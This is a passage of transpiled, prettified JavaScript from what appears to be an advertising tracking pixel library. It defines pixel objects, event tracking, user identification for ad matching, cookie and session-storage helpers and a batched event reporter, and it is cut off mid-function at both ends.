        var t = o.context.methods.track(o.pixelCode, e, n, r, p.TRACK);
        Object(v.t)(o.pixelCode) && o.context.methods.trackSelfHost(o.pixelCode, e, n, r), Object(g.l)() && !o.context.methods.isOnSitePage() && o.context.methods.trackPCM(o.pixelCode, e, n), t && t instanceof Promise && t.then(function (t) {
          o.context.methods.reportFlConv && o.context.methods.reportFlConv(t);
        });
      });
    }, l.prototype.isNonPartner = function () {
      return !this.partner || "None" === this.partner;
    }, l.prototype.getSignalDiagnosticLabels = function () {
      var t = this.context.methods.getSignalDiagnosticLabels();
      if (!t) return Object.assign({}, b.i);
      var e = this.advancedMatchingAvailableProperties,
        n = e.email,
        r = e.phone_number,
        o = e.auto_email,
        e = e.auto_phone_number,
        n = !!this.isNonPartner() || n,
        r = !!this.isNonPartner() || r,
        e = Object(v.a)(t, {
          raw_email: n,
          raw_phone: r,
          hashed_email: n,
          hashed_phone: r,
          raw_auto_email: o,
          raw_auto_phone: e
        });
      return Object.assign({}, b.i, e);
    }, e = l;
    function l(t) {
      this.options = {}, this.plugins = {}, this.advancedMatchingAvailableProperties = {
        external_id: !0
      };
      var e = t.pixelCode,
        t = t.context;
      this.pixelCode = e, this.context = t, this.loaded = !1, this.pixelPromise = this.getInstance();
    }
    var m,
      _,
      O = (m = function (t, e) {
        return (m = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (t, e) {
          t.__proto__ = e;
        } || function (t, e) {
          for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]);
        })(t, e);
      }, function (t, e) {
        function n() {
          this.constructor = t;
        }
        m(t, e), t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n());
      }),
      E = function (t, a, c, u) {
        return new (c = c || Promise)(function (n, e) {
          function r(t) {
            try {
              i(u.next(t));
            } catch (t) {
              e(t);
            }
          }
          function o(t) {
            try {
              i(u.throw(t));
            } catch (t) {
              e(t);
            }
          }
          function i(t) {
            var e;
            t.done ? n(t.value) : ((e = t.value) instanceof c ? e : new c(function (t) {
              t(e);
            })).then(r, o);
          }
          i((u = u.apply(t, a || [])).next());
        });
      },
      I = function (n, r) {
        var o,
          i,
          a,
          c = {
            label: 0,
            sent: function () {
              if (1 & a[0]) throw a[1];
              return a[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: e(0),
            throw: e(1),
            return: e(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function e(e) {
          return function (t) {
            return function (e) {
              if (o) throw new TypeError("Generator is already executing.");
              for (; c;) try {
                if (o = 1, i && (a = 2 & e[0] ? i.return : e[0] ? i.throw || ((a = i.return) && a.call(i), 0) : i.next) && !(a = a.call(i, e[1])).done) return a;
                switch (i = 0, (e = a ? [2 & e[0], a.value] : e)[0]) {
                  case 0:
                  case 1:
                    a = e;
                    break;
                  case 4:
                    return c.label++, {
                      value: e[1],
                      done: !1
                    };
                  case 5:
                    c.label++, i = e[1], e = [0];
                    continue;
                  case 7:
                    e = c.ops.pop(), c.trys.pop();
                    continue;
                  default:
                    if (!(a = 0 < (a = c.trys).length && a[a.length - 1]) && (6 === e[0] || 2 === e[0])) {
                      c = 0;
                      continue;
                    }
                    if (3 === e[0] && (!a || e[1] > a[0] && e[1] < a[3])) {
                      c.label = e[1];
                      break;
                    }
                    if (6 === e[0] && c.label < a[1]) {
                      c.label = a[1], a = e;
                      break;
                    }
                    if (a && c.label < a[2]) {
                      c.label = a[2], c.ops.push(e);
                      break;
                    }
                    a[2] && c.ops.pop(), c.trys.pop();
                    continue;
                }
                e = r.call(n, c);
              } catch (t) {
                e = [6, t], i = 0;
              } finally {
                o = a = 0;
              }
              if (5 & e[0]) throw e[1];
              return {
                value: e[0] ? e[1] : void 0,
                done: !0
              };
            }([e, t]);
          };
        }
      },
      w = (O(x, _ = e), x.prototype.identify = function (t, e) {
        t && (Object(v.D)(t) || Object(v.B)(t) ? this.context.setUserInfo({
          external_id: t.toString()
        }) : Object(v.C)(t) && this.context.setUserInfo(t)), e && Object(v.C)(e) && this.context.setUserInfo(e);
      }, x.prototype.page = function (t) {
        window.location.href !== this.currentHref && (this.track("Pageview", t), this.currentHref = window.location.href);
      }, x.prototype.getInstance = function () {
        return E(this, void 0, void 0, function () {
          var e,
            n = this;
          return I(this, function (t) {
            return this.pixelPromise ? [2, this.pixelPromise] : (e = Object(v.p)(this.pixelCode), Object(v.z)() || e && e.info ? (this.pixelPromise = Promise.resolve(this), this.loaded = !0) : this.pixelPromise = new Promise(function (t, e) {
              i(Object(v.s)(n.pixelCode, location && location.hostname)).then(function () {
                n.loaded = !0, t(n);
              }).catch(function (t) {
                n.pixelPromise = null, e(t);
              });
            }), [2, this.pixelPromise]);
          });
        });
      }, x.prototype.track = function (t, e, n) {
        n && n.pixel_code && this.pixelCode != n.pixel_code || _.prototype.track.call(this, t, e, n);
      }, x);
    function x(t) {
      var e = _.call(this, t) || this;
      return e.currentHref = "", e.options = t.options || {}, e;
    }
    var S = (P.prototype.setAdvancedMatchingAvailableProperties = function (t) {}, P.prototype.getUserInfo = function () {
      return {};
    }, P.prototype.getPixelMatchedUserFormatInfo = function () {
      return {};
    }, P.prototype.getPixelMatchedUserFormatInfoV2 = function () {
      return {};
    }, P.prototype.page = function () {}, P.prototype.track = function (t, e, n) {
      void 0 === n && (n = {}), Object(v.G)(this.pixelCode, "track", [t, e, n]);
    }, P.prototype.setPixelInfo = function (t) {}, P.prototype.getPixelInfo = function () {
      return Promise.resolve({
        pixelCode: this.pixelCode,
        name: this.name,
        status: this.status,
        setupMode: this.setupMode,
        advertiserID: this.advertiserID,
        partner: this.partner,
        is_onsite: this.is_onsite,
        advancedMatchingAvailableProperties: {}
      });
    }, P.prototype.getSignalDiagnosticLabels = function () {
      return Object.assign({}, b.i);
    }, P);
    function P(t) {
      this.pixelCode = "", this.loaded = !1, this.status = 1, this.name = "", this.advertiserID = "", this.setupMode = 0, this.partner = "", this.is_onsite = !1, this.options = {}, this.plugins = {}, this.pixelCode = t;
    }
    new S("empty");
    var T = u("D0Ia"),
      O = (A.prototype.loadPixel = function (t) {
        Object(v.D)(t) && (this.context.methods.getPixel(t) ? Object(h.d)(T.a.DUPLICATE_PIXEL_CODE) : (t = this.createPixel(t), this.context.methods.addPixel(t)));
      }, A.prototype.setPageInfo = function (t, e) {
        this.context.methods.setPageInfo(t, e);
      }, A.prototype.usePlugin = function (t) {
        try {
          var e = new t(this.context);
          this.context.usePlugin(e);
        } catch (t) {}
      }, A.prototype.useDynamicPlugin = function (t) {
        try {
          var e = t(this.context);
          this.context.usePlugin(e);
        } catch (t) {}
      }, A.prototype.instance = function (t) {
        var e = this.context.methods.getPixel(t);
        return e || (Object(h.a)(d.a.PIXEL_EMPTY, {
          message: "",
          stack: ""
        }, {
          pixelCode: t
        }), new S(t));
      }, A.prototype.instances = function () {
        return this.context.methods.getAllPixels();
      }, A.prototype.identify = function (t, e) {
        t && (Object(v.D)(t) || Object(v.B)(t) ? this.context.setUserInfo({
          external_id: t.toString()
        }) : Object(v.C)(t) && this.context.setUserInfo(t)), e && Object(v.C)(e) && this.context.setUserInfo(e);
      }, A.prototype.page = function (e) {
        this.instances().forEach(function (t) {
          c(s.PIXEL_SEND, t.pixelCode, "Pageview"), t.page(e);
        });
      }, A.prototype.track = function (n, r, o) {
        var t = (o = void 0 === o ? {} : o).pixel_code;
        if (void 0 !== t) {
          t = this.instance(t);
          return t instanceof S ? void 0 : void t.track(n, r, o);
        }
        this.instances().forEach(function (t, e) {
          t.track(n, r, Object.assign({
            _i: e
          }, o));
        });
      }, A);
    function A() {
      this.initialize = !0;
    }
    u("0fq1");
    function j(t) {
      "number" == typeof (t = Object.assign({}, {
        path: "/"
      }, t)).expires && (t.expires = new Date(Date.now() + 864e5 * t.expires)), t.expires instanceof Date && (t.expires = t.expires.toUTCString());
      var e,
        n = "";
      for (e in t) t[e] && (n += "; " + e, !0 !== t[e] && (n += "=" + t[e].split(";")[0]));
      return n;
    }
    function N(e) {
      return L(void 0, void 0, void 0, function () {
        return D(this, function (t) {
          try {
            return [2, B(e)];
          } catch (t) {}
          return [2, ""];
        });
      });
    }
    function k(a, c, u) {
      return L(void 0, void 0, void 0, function () {
        var e, n, r, o, i;
        return D(this, function (t) {
          switch (t.label) {
            case 0:
              return [3, 2];
            case 1:
              return t.sent(), [3, 3];
            case 2:
              try {
                if (u) {
                  if (F) return u.domain = F, document.cookie = a + "=" + c + j(u), [2];
                  for (e = u.domain || window.location.hostname, n = e.split("."), r = n.length, o = "", i = 0; i < r; i++) if (o = "." + n[r - i - 1] + o, u.domain = o, document.cookie = a + "=" + c + j(u), B(a)) {
                    F = o;
                    break;
                  }
                } else document.cookie = a + "=" + c + j(u);
              } catch (t) {}
              t.label = 3;
            case 3:
              return [2, Promise.resolve()];
          }
        });
      });
    }
    function R(r) {
      return U(void 0, void 0, void 0, function () {
        var n;
        return V(this, function (t) {
          switch (t.label) {
            case 0:
              return t.trys.push([0, 2,, 3]), [4, (e = r, L(void 0, void 0, void 0, function () {
                return D(this, function (t) {
                  try {
                    return [2, sessionStorage.getItem(e) || ""];
                  } catch (t) {
                    return [2, ""];
                  }
                  return [2];
                });
              }))];
            case 1:
              return n = t.sent(), [2, JSON.parse(n)];
            case 2:
              return t.sent(), [2, null];
            case 3:
              return [2];
          }
          var e;
        });
      });
    }
    function M(t, e) {
      try {
        !function (t, e) {
          try {
            sessionStorage.setItem(t, e);
          } catch (t) {}
        }(t, JSON.stringify(e));
      } catch (t) {}
    }
    function C(t, e) {
      return (e = J(e || window.location.href, t)) || J(document.referrer, t);
    }
    var L = function (t, a, c, u) {
        return new (c = c || Promise)(function (n, e) {
          function r(t) {
            try {
              i(u.next(t));
            } catch (t) {
              e(t);
            }
          }
          function o(t) {
            try {
              i(u.throw(t));
            } catch (t) {
              e(t);
            }
          }
          function i(t) {
            var e;
            t.done ? n(t.value) : ((e = t.value) instanceof c ? e : new c(function (t) {
              t(e);
            })).then(r, o);
          }
          i((u = u.apply(t, a || [])).next());
        });
      },
      D = function (n, r) {
        var o,
          i,
          a,
          c = {
            label: 0,
            sent: function () {
              if (1 & a[0]) throw a[1];
              return a[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: e(0),
            throw: e(1),
            return: e(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function e(e) {
          return function (t) {
            return function (e) {
              if (o) throw new TypeError("Generator is already executing.");
              for (; c;) try {
                if (o = 1, i && (a = 2 & e[0] ? i.return : e[0] ? i.throw || ((a = i.return) && a.call(i), 0) : i.next) && !(a = a.call(i, e[1])).done) return a;
                switch (i = 0, (e = a ? [2 & e[0], a.value] : e)[0]) {
                  case 0:
                  case 1:
                    a = e;
                    break;
                  case 4:
                    return c.label++, {
                      value: e[1],
                      done: !1
                    };
                  case 5:
                    c.label++, i = e[1], e = [0];
                    continue;
                  case 7:
                    e = c.ops.pop(), c.trys.pop();
                    continue;
                  default:
                    if (!(a = 0 < (a = c.trys).length && a[a.length - 1]) && (6 === e[0] || 2 === e[0])) {
                      c = 0;
                      continue;
                    }
                    if (3 === e[0] && (!a || e[1] > a[0] && e[1] < a[3])) {
                      c.label = e[1];
                      break;
                    }
                    if (6 === e[0] && c.label < a[1]) {
                      c.label = a[1], a = e;
                      break;
                    }
                    if (a && c.label < a[2]) {
                      c.label = a[2], c.ops.push(e);
                      break;
                    }
                    a[2] && c.ops.pop(), c.trys.pop();
                    continue;
                }
                e = r.call(n, c);
              } catch (t) {
                e = [6, t], i = 0;
              } finally {
                o = a = 0;
              }
              if (5 & e[0]) throw e[1];
              return {
                value: e[0] ? e[1] : void 0,
                done: !0
              };
            }([e, t]);
          };
        }
      },
      F = "",
      B = function (t) {
        if (0 === document.cookie.length) return "";
        var e = document.cookie.indexOf(t + "=");
        if (-1 === e) return "";
        e = e + t.length + 1, t = document.cookie.indexOf(";", e);
        return -1 === t ? unescape(document.cookie.substring(e)) : unescape(document.cookie.substring(e, t));
      },
      U = function (t, a, c, u) {
        return new (c = c || Promise)(function (n, e) {
          function r(t) {
            try {
              i(u.next(t));
            } catch (t) {
              e(t);
            }
          }
          function o(t) {
            try {
              i(u.throw(t));
            } catch (t) {
              e(t);
            }
          }
          function i(t) {
            var e;
            t.done ? n(t.value) : ((e = t.value) instanceof c ? e : new c(function (t) {
              t(e);
            })).then(r, o);
          }
          i((u = u.apply(t, a || [])).next());
        });
      },
      V = function (n, r) {
        var o,
          i,
          a,
          c = {
            label: 0,
            sent: function () {
              if (1 & a[0]) throw a[1];
              return a[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: e(0),
            throw: e(1),
            return: e(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function e(e) {
          return function (t) {
            return function (e) {
              if (o) throw new TypeError("Generator is already executing.");
              for (; c;) try {
                if (o = 1, i && (a = 2 & e[0] ? i.return : e[0] ? i.throw || ((a = i.return) && a.call(i), 0) : i.next) && !(a = a.call(i, e[1])).done) return a;
                switch (i = 0, (e = a ? [2 & e[0], a.value] : e)[0]) {
                  case 0:
                  case 1:
                    a = e;
                    break;
                  case 4:
                    return c.label++, {
                      value: e[1],
                      done: !1
                    };
                  case 5:
                    c.label++, i = e[1], e = [0];
                    continue;
                  case 7:
                    e = c.ops.pop(), c.trys.pop();
                    continue;
                  default:
                    if (!(a = 0 < (a = c.trys).length && a[a.length - 1]) && (6 === e[0] || 2 === e[0])) {
                      c = 0;
                      continue;
                    }
                    if (3 === e[0] && (!a || e[1] > a[0] && e[1] < a[3])) {
                      c.label = e[1];
                      break;
                    }
                    if (6 === e[0] && c.label < a[1]) {
                      c.label = a[1], a = e;
                      break;
                    }
                    if (a && c.label < a[2]) {
                      c.label = a[2], c.ops.push(e);
                      break;
                    }
                    a[2] && c.ops.pop(), c.trys.pop();
                    continue;
                }
                e = r.call(n, c);
              } catch (t) {
                e = [6, t], i = 0;
              } finally {
                o = a = 0;
              }
              if (5 & e[0]) throw e[1];
              return {
                value: e[0] ? e[1] : void 0,
                done: !0
              };
            }([e, t]);
          };
        }
      };
    function J(t, e) {
      try {
        return new URL(t).searchParams.get(e) || "";
      } catch (t) {
        return "";
      }
    }
    function H(c) {
      return W(void 0, void 0, void 0, function () {
        var i, a;
        return K(this, function (t) {
          switch (t.label) {
            case 0:
              return t.trys.push([0, 2,, 3]), i = C("tt_test_id", c), [4, N("tt_test_id")];
            case 1:
              return a = t.sent(), i && i !== a && (e = "tt_test_id", n = i, (r = void 0) === r && (r = "/"), void 0 === (o = "session") && (o = Object(v.e)()), G(void 0, void 0, void 0, function () {
                return X(this, function (t) {
                  return k(e, n, {
                    path: r,
                    expires: o
                  }), [2];
                });
              })), [2, i || a];
            case 2:
              return t.sent(), [2, ""];
            case 3:
              return [2];
          }
          var e, n, r, o;
        });
      });
    }
    function Y(r) {
      var o = new Array(r.length),
        i = 0;
      return new Promise(function (n, t) {
        for (var e = 0; e < r.length; e++) !function (e) {
          var t = r[e];
          t && "function" == typeof t.then ? t.then(function (t) {
            o[e] = {
              status: "fulfilled",
              value: t
            }, ++i === r.length && n(o);
          }).catch(function (t) {
            o[e] = {
              status: "rejected",
              reason: t
            }, ++i === r.length && n(o);
          }) : (o[e] = {
            status: "fulfilled",
            value: t
          }, ++i === r.length && n(o));
        }(e);
      });
    }
    var G = function (t, a, c, u) {
        return new (c = c || Promise)(function (n, e) {
          function r(t) {
            try {
              i(u.next(t));
            } catch (t) {
              e(t);
            }
          }
          function o(t) {
            try {
              i(u.throw(t));
            } catch (t) {
              e(t);
            }
          }
          function i(t) {
            var e;
            t.done ? n(t.value) : ((e = t.value) instanceof c ? e : new c(function (t) {
              t(e);
            })).then(r, o);
          }
          i((u = u.apply(t, a || [])).next());
        });
      },
      X = function (n, r) {
        var o,
          i,
          a,
          c = {
            label: 0,
            sent: function () {
              if (1 & a[0]) throw a[1];
              return a[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: e(0),
            throw: e(1),
            return: e(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function e(e) {
          return function (t) {
            return function (e) {
              if (o) throw new TypeError("Generator is already executing.");
              for (; c;) try {
                if (o = 1, i && (a = 2 & e[0] ? i.return : e[0] ? i.throw || ((a = i.return) && a.call(i), 0) : i.next) && !(a = a.call(i, e[1])).done) return a;
                switch (i = 0, (e = a ? [2 & e[0], a.value] : e)[0]) {
                  case 0:
                  case 1:
                    a = e;
                    break;
                  case 4:
                    return c.label++, {
                      value: e[1],
                      done: !1
                    };
                  case 5:
                    c.label++, i = e[1], e = [0];
                    continue;
                  case 7:
                    e = c.ops.pop(), c.trys.pop();
                    continue;
                  default:
                    if (!(a = 0 < (a = c.trys).length && a[a.length - 1]) && (6 === e[0] || 2 === e[0])) {
                      c = 0;
                      continue;
                    }
                    if (3 === e[0] && (!a || e[1] > a[0] && e[1] < a[3])) {
                      c.label = e[1];
                      break;
                    }
                    if (6 === e[0] && c.label < a[1]) {
                      c.label = a[1], a = e;
                      break;
                    }
                    if (a && c.label < a[2]) {
                      c.label = a[2], c.ops.push(e);
                      break;
                    }
                    a[2] && c.ops.pop(), c.trys.pop();
                    continue;
                }
                e = r.call(n, c);
              } catch (t) {
                e = [6, t], i = 0;
              } finally {
                o = a = 0;
              }
              if (5 & e[0]) throw e[1];
              return {
                value: e[0] ? e[1] : void 0,
                done: !0
              };
            }([e, t]);
          };
        }
      },
      W = function (t, a, c, u) {
        return new (c = c || Promise)(function (n, e) {
          function r(t) {
            try {
              i(u.next(t));
            } catch (t) {
              e(t);
            }
          }
          function o(t) {
            try {
              i(u.throw(t));
            } catch (t) {
              e(t);
            }
          }
          function i(t) {
            var e;
            t.done ? n(t.value) : ((e = t.value) instanceof c ? e : new c(function (t) {
              t(e);
            })).then(r, o);
          }
          i((u = u.apply(t, a || [])).next());
        });
      },
      K = function (n, r) {
        var o,
          i,
          a,
          c = {
            label: 0,
            sent: function () {
              if (1 & a[0]) throw a[1];
              return a[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: e(0),
            throw: e(1),
            return: e(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function e(e) {
          return function (t) {
            return function (e) {
              if (o) throw new TypeError("Generator is already executing.");
              for (; c;) try {
                if (o = 1, i && (a = 2 & e[0] ? i.return : e[0] ? i.throw || ((a = i.return) && a.call(i), 0) : i.next) && !(a = a.call(i, e[1])).done) return a;
                switch (i = 0, (e = a ? [2 & e[0], a.value] : e)[0]) {
                  case 0:
                  case 1:
                    a = e;
                    break;
                  case 4:
                    return c.label++, {
                      value: e[1],
                      done: !1
                    };
                  case 5:
                    c.label++, i = e[1], e = [0];
                    continue;
                  case 7:
                    e = c.ops.pop(), c.trys.pop();
                    continue;
                  default:
                    if (!(a = 0 < (a = c.trys).length && a[a.length - 1]) && (6 === e[0] || 2 === e[0])) {
                      c = 0;
                      continue;
                    }
                    if (3 === e[0] && (!a || e[1] > a[0] && e[1] < a[3])) {
                      c.label = e[1];
                      break;
                    }
                    if (6 === e[0] && c.label < a[1]) {
                      c.label = a[1], a = e;
                      break;
                    }
                    if (a && c.label < a[2]) {
                      c.label = a[2], c.ops.push(e);
                      break;
                    }
                    a[2] && c.ops.pop(), c.trys.pop();
                    continue;
                }
                e = r.call(n, c);
              } catch (t) {
                e = [6, t], i = 0;
              } finally {
                o = a = 0;
              }
              if (5 & e[0]) throw e[1];
              return {
                value: e[0] ? e[1] : void 0,
                done: !0
              };
            }([e, t]);
          };
        }
      },
      e = Object(v.n)() || [];
    e.identifyPlugin ? Ft = e.identifyPlugin : (ft = u("wK/p").default, e.identifyPlugin = Ft = new ft(), Ft.init());
    var z,
      q = Ft,
      Z = (String.fromCharCode.bind(String), Array.prototype.slice.call("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="), u("ZFXO"));
    (e = z = z || {})[e.defaultReport = 0] = "defaultReport", e[e.httpReport = 1] = "httpReport", e[e.htmlHttpReport = 2] = "htmlHttpReport";
    function Q(t, e) {
      return "selfhost" === t && e && Object(v.t)(e) ? "https://" + Object(v.t)(e) + "/api/v2/pixel" : (t = {
        PCM: Z.k,
        track: Z.o,
        performance: Z.l,
        interaction: Z.j,
        performance_interaction: Z.m,
        auto_config: Z.i
      }[t]) || null;
    }
    function $(t) {
      return t = JSON.stringify(t), (0, u("52Kp").encodeURI)(t);
    }
    function tt(t) {
      var r,
        t = t.reduce(function (t, e) {
          var n = e.info,
            e = e.data,
            n = n.pixelCode + "-" + n.type;
          return void 0 === t[n] && (t[n] = []), t[n].push(e), t;
        }, {});
      return r = t, Object.keys(r).map(function (t) {
        var e = et(t.split("-"), 2),
          n = e[0],
          e = e[1],
          t = r[t];
        return {
          info: {
            pixelCode: n,
            type: e
          },
          data: nt(t)
        };
      });
    }
    var et = function (t, e) {
      var n = "function" == typeof Symbol && t[Symbol.iterator];
      if (!n) return t;
      var r,
        o,
        i = n.call(t),
        a = [];
      try {
        for (; (void 0 === e || 0 < e--) && !(r = i.next()).done;) a.push(r.value);
      } catch (t) {
        o = {
          error: t
        };
      } finally {
        try {
          r && !r.done && (n = i.return) && n.call(i);
        } finally {
          if (o) throw o.error;
        }
      }
      return a;
    };
    var nt = function (t) {
        var o = ["click", "scroll"];
        return t.reduce(function (n, r) {
          return Object.keys(r).forEach(function (t) {
            var e = r[t];
            -1 < o.indexOf(t) ? n[t] ? n[t].push(e) : n[t] = [e] : n[t] = e;
          }), n;
        }, {});
      },
      rt = (ot.prototype.push = function (t, e) {
        this.stash.push(t), this.observer(e);
      }, ot.prototype.clear = function () {
        this.stash = [];
      }, ot.prototype.observer = function (t) {
        (t = void 0 === t ? !1 : t) && (this.triggerHandler(), this.clear());
      }, ot.prototype.setBatchParameter = function (t) {
        var e = t.interval,
          t = t.handler;
        this.triggerHandler(), t && (this.handler = t), e && (clearInterval(this.timer), this.interval = e, this.startInterval());
      }, ot.prototype.startInterval = function () {
        var t = this;
        return setInterval(function () {
          t.triggerHandler();
        }, this.interval);
      }, ot.prototype.triggerHandler = function () {
        var t = this.stash.slice();
        this.clear(), t.length && this.handler && this.handler(t);
      }, ot);
    function ot(t) {
      var e = t.interval,
        t = t.handler;
      this.stash = [], this.interval = 1e3, this.interval = e || 1e3, this.handler = t || function () {}, this.timer = this.startInterval();
    }
    var it = ["ttuts", "ad_info_from"],
      at = u("mFs5");
    function ct(t, e) {
      var n = Object.assign({}, t);
      return e.forEach(function (t) {
        null != n[t] && delete n[t];
      }), n;
    }
    var ut = function (t, e) {
        var n = "function" == typeof Symbol && t[Symbol.iterator];
        if (!n) return t;
        var r,
          o,
          i = n.call(t),
          a = [];
        try {
          for (; (void 0 === e || 0 < e--) && !(r = i.next()).done;) a.push(r.value);
        } catch (t) {
          o = {
            error: t
          };
        } finally {
          try {
            r && !r.done && (n = i.return) && n.call(i);
          } finally {
            if (o) throw o.error;
          }
        }
        return a;
      },
      st = function (t) {
        var e = "function" == typeof Symbol && Symbol.iterator,
          n = e && t[e],
          r = 0;
        if (n) return n.call(t);
        if (t && "number" == typeof t.length) return {
          next: function () {
            return {
              value: (t = t && r >= t.length ? void 0 : t) && t[r++],
              done: !t
            };
          }
        };
        throw new TypeError(e ? "Object is not iterable." : "Symbol.iterator is not defined.");
      },
      ft = (Object.defineProperty(lt.prototype, "pixels", {
        get: function () {
          var e = this.data.pixelMap;
          return Object.keys(e).map(function (t) {
            return e[t];
          });
        },
        enumerable: !1,
        configurable: !0
      }), lt.prototype.usePlugin = function (t) {
        this.plugins.push(t);
      }, lt.prototype.getPlugin = function (e) {
        return this.plugins.find(function (t) {
          return t.name === e;
        });
      }, lt.prototype.getInitContextData = function (t) {
        return {
          pixelMap: {},
          customData: {},
          userInfo: {},
          userFormatInfo: {},
          adInfo: {},
          appInfo: {},
          libraryInfo: t,
          pageInfo: {
            url: ""
          },
          pageSign: this.initPageSign(),
          signalDiagnosticLabels: Object.assign({}, b.i)
        };
      }, lt.prototype.getInitContextMethods = function () {
        return {
          reportFlConv: this.reportFlConv.bind(this),
          addPixel: this.addPixel.bind(this),
          getAllPixels: this.getAllPixels.bind(this),
          getPixel: this.getPixel.bind(this),
          getUserFormatInfo: this.getUserFormatInfo.bind(this),
          getUserFormatInfoV2: this.getUserFormatInfoV2.bind(this),
          getUserInfo: this.getUserInfo.bind(this),
          setUserInfo: this.setUserInfo.bind(this),
          getAdInfo: this.getAdInfo.bind(this),
          setAdInfo: this.setAdInfo.bind(this),
          getAppInfo: this.getAppInfo.bind(this),
          setAppInfo: this.setAppInfo.bind(this),
          addCustomMethod: this.addCustomMethod.bind(this),
          callCustomMethod: this.callCustomMethod.bind(this),
          getPageDetail: this.getPageDetail.bind(this),
          setPageInfo: this.setPageInfo.bind(this),
          getCustomData: this.getCustomData.bind(this),
          setCustomData: this.setCustomData.bind(this),
          track: this.track.bind(this),
          batchTrack: this.batchTrack.bind(this),
          trackPCM: this.trackPCM.bind(this),
          trackSelfHost: this.trackSelfHost.bind(this),
          setBatchConfig: this.setBatchConfig.bind(this),
          trackBloomFilter: this.trackBloomFilter.bind(this),
          mergeTrack: this.mergeTrack.bind(this),
          isOnSitePage: this.isOnSitePage.bind(this),
          assemblyData: this.assemblyData.bind(this),
          getSignalDiagnosticLabels: this.getSignalDiagnosticLabels.bind(this)
        };
      }, lt.prototype.track = function (t, e, n, r, o, i) {
        var a,
          c = this;
        return void 0 === i && (i = z.defaultReport), a = this.reportPreposition, ("function" == typeof Promise.allSettled ? Promise.allSettled(a) : Y(a)).then(function () {
          return c.trackSync(t, e, n, r, o, i);
        });
      }, lt.prototype.trackPCM = function (t, e, n) {}, lt.prototype.trackSelfHost = function (t, e, n, r) {}, lt.prototype.trackBloomFilter = function (t, e, n) {}, lt.prototype.trackSync = function (e, n, t, r, o, i) {
        if (void 0 === i && (i = z.defaultReport), null !== this.methods.getPixel(e)) {
          var a = o !== p.SELFHOST ? this.assemblyData(e, n, t, r, o) : this.assemblySelfHostData(e, n, t, r),
            t = Q(o, e);
          if (null !== t) return this.plugins.forEach(function (t) {
            t.pixelSend(e, n, a, r, o);
          }), this.reportService.report(t, a, i), a;
        }
      }, lt.prototype.mergeTrack = function (t, e) {
        var n = this.assemblyMergedData("", t, {}, e),
          t = Q(e);
        null !== t && (e = e, e = {
          performance_interaction: z.httpReport
        }[e] || z.htmlHttpReport, this.reportService.report(t, n, e));
      }, lt.prototype.batchTrack = function (t, e, n) {
        this.batch.push({
          info: t,
          data: e
        }, n = void 0 === n ? !1 : n);
      }, lt.prototype.setBatchConfig = function (t) {
        this.batch.setBatchParameter(t);
      }, lt.prototype.addPixel = function (e) {
        var t = e.pixelCode;
        this.data.pixelMap[t] = e, this.plugins.forEach(function (t) {
          t.pixelDidMount(e);
        });
      }, lt.prototype.reportFlConv = function (t) {}, lt.prototype.getUserInfo = function () {
        return this.data.userInfo;
      }, lt.prototype.getUserFormatInfo = function () {
        return this.data.userFormatInfo || {};
      }, lt.prototype.getUserFormatInfoV2 = function () {
        return this.data.userFormatInfoV2 || {};
      }, lt.prototype.setUserInfo = function (t) {
        var n,
          r = this;
        void 0 === t && (t = {}), 0 !== Object.keys(t).length && (n = {}, Object.entries(t).forEach(function (t) {
          var e = ut(t, 2),
            t = e[0],
            e = e[1];
          e && (t !== at.a ? n[t] = String(e).trim() : r.setUserInfoWithoutIdentifyPlugin(((t = {})[at.a] = e, t)));
        }), this.reportPreposition.push(q.handleUserProperties(this.data, n, t).then(function (t) {
          var e;
          t && t.userProperties && (e = Object.assign(r.data.userInfo, t.userProperties), r.data.userFormatInfo || (r.data.userFormatInfo = {}), r.data.userFormatInfoV2 || (r.data.userFormatInfoV2 = {}), Object.assign(r.data.userFormatInfo, t.userDataFormat), Object.assign(r.data.userFormatInfoV2, t.userDataFormatV2), Object.assign(r.data.signalDiagnosticLabels, t.identifierLabel), 0 !== Object.keys(e).length && (1 === Object.keys(n).length && Object.keys(n).includes("external_id") || (e = (e = r.getAllPixels()) && e[0] ? e[0] : "") && 0 < Object.keys(Object.assign({}, e.getUserInfo(b.h.Manual), e.getUserInfo(b.h.Auto))).length && r.track(e ? e.pixelCode : "", "EnrichAM", {}, {}, p.TRACK)));
        }).catch(function (t) {
          Object(h.a)(d.a.API_ERROR, t, {
            extJSON: {
              api: "identify"
            }
          });
        })));
      }, lt.prototype.setUserInfoWithoutIdentifyPlugin = function (t) {
        t && Object.assign(this.data.userInfo, t);
      }, lt.prototype.getAllPixels = function () {
        return this.pixels;
      }, lt.prototype.setAdInfo = function (t) {
        t && (this.data.adInfo ? this.data.adInfo = Object.assign({}, this.data.adInfo, t) : this.data.adInfo = t);
      }, lt.prototype.getAdInfo = function () {
        return this.data.adInfo;
      }, lt.prototype.setAppInfo = function (t) {
        t && (this.data.appInfo = Object.assign({}, this.data.appInfo, t));
      }, lt.prototype.getAppInfo = function () {
        return this.data.appInfo;
      }, lt.prototype.getPixel = function (t) {
        var e = this.data.pixelMap;
        return e[t] || null;
      }, lt.prototype.getSignalDiagnosticLabels = function () {
        return this.data.signalDiagnosticLabels;
      }, lt.prototype.addCustomMethod = function (t, e) {
        this.customMethods[t] || (this.customMethods[t] = e);
      }, lt.prototype.callCustomMethod = function (t) {
        for (var e = [], n = 1; n < arguments.length; n++) e[n - 1] = arguments[n];
        t = this.customMethods[t];
        return t ? t.apply(this, e) : null;
      }, lt.prototype.getPageDetail = function () {
        return {
          pageInfo: this.data.pageInfo,
          pageSign: this.data.pageSign
        };
      }, lt.prototype.setPageInfo = function (e, t) {
        var n,
